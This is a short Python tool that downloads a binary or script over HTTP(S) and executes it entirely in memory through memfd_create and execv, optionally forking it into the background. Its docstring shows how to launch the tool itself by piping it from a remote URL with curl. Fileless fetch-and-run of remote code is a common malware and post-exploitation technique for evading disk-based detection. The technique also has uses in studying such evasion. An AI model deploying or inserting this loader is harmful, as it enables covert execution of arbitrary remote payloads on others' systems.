"""
Pull a binary via http(s) and execute it in memory (does not touch disk).
You can run it like this:
python <(curl -s https://URL1/fileless.py) https://URL2/binary -a -b -c

If the environment variable FORK is set the newly executed program will
fork into background.
"""

from ctypes import CDLL
from os import execv, fork, environ
from http import client as http_client
from sys import argv, exit as sys_exit


def fetch_and_execv(url: str, params: list[str]):
    """
    Fetch a binary or a script beginning with a hash-bang and execute it in
    memory.
    This method does not return since it calls execv.
    Args:
        url (str): http(s) location of the executable
        params (list[str]): list of command line arguments for the executable
    """

    # parse url
    protocol, uri = url.split("://", 1)
    host_port, location = uri.split("/", 1)
    host, port = host_port.split(":", 1) if ":" in host_port else\
        (host_port, 443 if protocol == "https" else 80)

    # connect and fetch executable
    print(host, port)
    if protocol == "http":
        client = http_client.HTTPConnection(host, port)
    elif protocol == "https":
        client = http_client.HTTPSConnection(host, port)
    else:
        raise NotImplementedError(f"cannot handle '{protocol}'")

    client.connect()
    client.request("GET", location)
    res = client.getresponse().read()

    # create memfd, write binary into it and execute
    path = f"/proc/self/fd/{CDLL('libc.so.6').memfd_create('a', 0)}"
    with open(path, "wb+") as memfile:
        memfile.write(res)

    if fork() and environ.get("FORK"):
        sys_exit()

    execv(path, [path] + params)


if __name__ == "__main__":
    fetch_and_execv(argv[1], argv[2:])
